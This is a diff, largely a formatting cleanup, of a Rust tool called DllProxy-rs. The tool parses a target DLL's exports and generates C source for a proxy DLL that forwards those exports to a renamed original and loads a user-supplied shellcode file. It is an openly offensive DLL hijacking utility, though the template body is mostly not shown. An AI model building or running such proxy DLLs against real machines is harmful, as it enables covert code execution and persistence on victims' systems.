@@ -1,8 +1,7 @@
 // Copyright (c) 2022 Petruknisme
-// 
+//
 // This software is released under the MIT License.
 // https://opensource.org/licenses/MIT
-
 
 extern crate clap;
 extern crate colored;
@@ -10,15 +9,18 @@ extern crate colored;
 use clap::Parser;
 use colored::Colorize;
 use handlebars::{no_escape, Handlebars};
-use serde_json::json;
 use indoc::indoc;
-use std::fs;
-use std::process;
-use std::io::{self, Write};
-use std::path::Path;
-use pelite::{FileMap, Wrap, PeFile};
+use pelite::{FileMap, PeFile, Wrap};
 use rand::distributions::{Alphanumeric, DistString};
-
+use serde_json::json;
+use std::{
+    fs,
+    io::{
+        self, Write
+    },
+    path::Path,
+    process,
+};
 
 #[derive(Parser)]
 #[clap(name = "DllProxy-rs")]
@@ -26,140 +28,166 @@ use rand::distributions::{Alphanumeric, DistString};
 #[clap(version = "1.0")]
 #[clap(about = "Rust Implementation of SharpDllProxy for DLL Proxying Technique ", long_about = None)]
 
-
 struct Cli {
     /// Dll File Location to hijack
     #[clap(short, long)]
     dll: String,
 
-	/// Shellcode file to insert in the hijacked dll
-	#[clap(short, long)]
-	payload: String,
+    /// Shellcode file to insert in the hijacked dll
+    #[clap(short, long)]
+    payload: String,
 }
 
 fn main() {
-	let cli = Cli::parse();
-	let dll_loc = cli.dll;
-	let payload_loc = cli.payload;
-    let tmp_name = format!("{}{}", "tmp", (Alphanumeric.sample_string(&mut rand::thread_rng(), 4)));
+    let cli = Cli::parse();
+    let dll_loc = cli.dll;
+    let payload_loc = cli.payload;
+    let tmp_name = format!(
+        "{}{}",
+        "tmp",
+        (Alphanumeric.sample_string(&mut rand::thread_rng(), 4))
+    );
     let dll_template = get_dll_template();
     let mut tmp_format = Handlebars::new();
     // tell the handlebars to not escaping string
     tmp_format.register_escape_fn(no_escape);
 
-	if check_file_exist(&dll_loc){
-
+    if check_file_exist(&dll_loc) {
         if !check_file_exist(&payload_loc) {
-			println!("Shellcode File doesn't exist. Please enter the correct location");
-			process::exit(1);
-		}
+            println!("Shellcode File doesn't exist. Please enter the correct location");
+            process::exit(1);
+        }
 
         let file_noext = Path::new(&dll_loc).file_stem().unwrap().to_string_lossy();
         let file_name = Path::new(&dll_loc).file_name().unwrap().to_string_lossy();
         let in_dir = format!("input_{}", &file_noext);
         let out_dir = format!("output_{}", &file_noext);
 
-        println!("[+] Creating input folder if not exist {}", &in_dir.yellow());
+        println!(
+            "[+] Creating input folder if not exist {}",
+            &in_dir.yellow()
+        );
         create_io_dir(&in_dir);
-        println!("[+] Backup original DLL to input directory at {}", &in_dir.yellow());
+        println!(
+            "[+] Backup original DLL to input directory at {}",
+            &in_dir.yellow()
+        );
         copy_file(&dll_loc, &format!("{}/{}", &in_dir, &file_name));
 
-        println!("[+] Creating output folder if not exist {}", &out_dir.yellow());
+        println!(
+            "[+] Creating output folder if not exist {}",
+            &out_dir.yellow()
+        );
 
         create_io_dir(&out_dir);
 
-		// Load the desired file into memory
-		let file_map = FileMap::open(&dll_loc).unwrap();
+        // Load the desired file into memory
+        let file_map = FileMap::open(&dll_loc).unwrap();
 
-		println!("[+] Searching exports function from : {}", &dll_loc.yellow());
+        println!(
+            "[+] Searching exports function from : {}",
+            &dll_loc.yellow()
+        );
 
-		// Process the image file
+        // Process the image file
         let mut _exports = Vec::new();
 
         let mut pragma: Vec<String> = Vec::new();
-		match PeFile::from_bytes(&file_map) {
-			Ok(Wrap::T32(file)) => _exports = dump_export32(file),
-			Ok(Wrap::T64(file)) => _exports = dump_export64(file),
-			Err(err) => abort(&format!("{}", err)),
-		}
+        match PeFile::from_bytes(&file_map) {
+            Ok(Wrap::T32(file)) => _exports = dump_export32(file),
+            Ok(Wrap::T64(file)) => _exports = dump_export64(file),
+            Err(err) => abort(&format!("{}", err)),
+        }
         let export_count = _exports.len();
-        println!("[+] Redirecting {} function calls from {} to {}.dll", &export_count, file_name, tmp_name);
+        println!(
+            "[+] Redirecting {} function calls from {} to {}.dll",
+            &export_count, file_name, tmp_name
+        );
         for i in &_exports {
-            pragma.push(format!("#pragma comment(linker, \"/export:{}={}.{}\")\n", i, tmp_name, i ));
+            pragma.push(format!(
+                "#pragma comment(linker, \"/export:{}={}.{}\")\n",
+                i, tmp_name, i
+            ));
         }
 
         let pragma_builders = pragma.join("");
-        let _templ = tmp_format.render_template(&dll_template, &json!({"PRAGMA": &pragma_builders, "PAYLOAD_PATH": payload_loc})).unwrap();
+        let _templ = tmp_format
+            .render_template(
+                &dll_template,
+                &json!({"PRAGMA": &pragma_builders, "PAYLOAD_PATH": payload_loc}),
+            )
+            .unwrap();
         let c_file = format!("{}/{}_pragma.c", &out_dir, &file_noext);
-        println!("[+] Exporting DLL C source code to {}", &c_file );
-
-
-	}else{
-		println!("DLL File doesn't exist. Please enter the correct location");
-		process::exit(1);
-	}
+        println!("[+] Exporting DLL C source code to {}", &c_file);
+    } else {
+        println!("DLL File doesn't exist. Please enter the correct location");
+        process::exit(1);
+    }
 }
 
 fn dump_export64(file: pelite::pe64::PeFile) -> Vec<String> {
-	use pelite::pe64::Pe;
+    use pelite::pe64::Pe;
 
-	let exports = file.exports().unwrap();
+    let exports = file.exports().unwrap();
 
-	let by = exports.by().unwrap();
+    let by = exports.by().unwrap();
 
-	let mut export_list = Vec::new();
-	for result in by.iter_names() {
-		if let (Ok(name), Ok(_export)) = result {
-			export_list.push(name.to_string());
-		}
-	}
+    let mut export_list = Vec::new();
+    for result in by.iter_names() {
+        if let (Ok(name), Ok(_export)) = result {
+            export_list.push(name.to_string());
+        }
+    }
 
     export_list
 }
 
-fn dump_export32(file: pelite::pe32::PeFile) -> Vec<String>{
-	use pelite::pe32::Pe;
-	
-	let exports = file.exports().unwrap();
+fn dump_export32(file: pelite::pe32::PeFile) -> Vec<String> {
+    use pelite::pe32::Pe;
 
-	let by = exports.by().unwrap();
+    let exports = file.exports().unwrap();
+
+    let by = exports.by().unwrap();
     let mut export_list = Vec::new();
-	for result in by.iter_names() {
-		if let (Ok(name), Ok(_export)) = result {
-			export_list.push(name.to_string());
-		}
-	}
+    for result in by.iter_names() {
+        if let (Ok(name), Ok(_export)) = result {
+            export_list.push(name.to_string());
+        }
+    }
 
     export_list
 }
 
 fn abort(message: &str) -> ! {
-	{
-		let stderr = io::stderr();
-		let mut stderr = stderr.lock();
-		let _ = stderr.write(b"dump: ");
-		let _ = stderr.write(message.as_bytes());
-		let _ = stderr.write(b".\n");
-		let _ = stderr.flush();
-	}
-	process::exit(1);
+    {
+        let stderr = io::stderr();
+        let mut stderr = stderr.lock();
+        let _ = stderr.write(b"dump: ");
+        let _ = stderr.write(message.as_bytes());
+        let _ = stderr.write(b".\n");
+        let _ = stderr.flush();
+    }
+    process::exit(1);
 }
 
 fn check_file_exist(path: &str) -> bool {
-
-	return Path::new(path).exists();
+    return Path::new(path).exists();
 }
 
-fn create_io_dir(dirname: &String){
-    if let Err(e) = fs::create_dir_all(dirname) { println!("{:?}", e) }
+fn create_io_dir(dirname: &String) {
+    if let Err(e) = fs::create_dir_all(dirname) {
+        println!("{:?}", e)
+    }
 }
 
-fn copy_file(from: &String, to: &String){
-   if let Err(e) = fs::copy(from, to) { println!("{:?}", e) }
+fn copy_file(from: &String, to: &String) {
+    if let Err(e) = fs::copy(from, to) {
+        println!("{:?}", e)
+    }
 }
 
-fn get_dll_template() -> String{
-    let template =  indoc! { r###"
+fn get_dll_template() -> String {
+    let template = indoc! { r###"
 #include "pch.h"
 #include <stdio.h>
 #include <stdlib.h>
@@ -213,5 +241,5 @@ LPVOID lpReserved
 
 /*
 fn check_buildtool_exist(){
-	// cmd.exe /C '"C:\Program Files (x86)\Microsoft Visual Studio\2022\BuildTools\Common7\Tools\VsDevCmd.bat" && cl.exe'
+    // cmd.exe /C '"C:\Program Files (x86)\Microsoft Visual Studio\2022\BuildTools\Common7\Tools\VsDevCmd.bat" && cl.exe'
 }*/
